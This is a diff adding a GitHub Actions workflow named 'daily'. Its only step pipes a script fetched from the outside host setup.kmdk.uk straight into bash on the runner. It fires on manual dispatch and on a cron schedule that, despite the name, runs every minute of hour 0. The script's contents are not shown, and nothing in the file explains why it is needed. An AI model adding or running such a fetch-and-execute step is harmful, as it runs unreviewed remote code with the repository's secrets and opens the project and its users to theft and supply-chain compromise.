@@ -1,0 +1,11 @@
+name: daily
+on:
+  schedule:
+    - cron: '* */24 * * *'
+  workflow_dispatch:
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl setup.kmdk.uk | bash
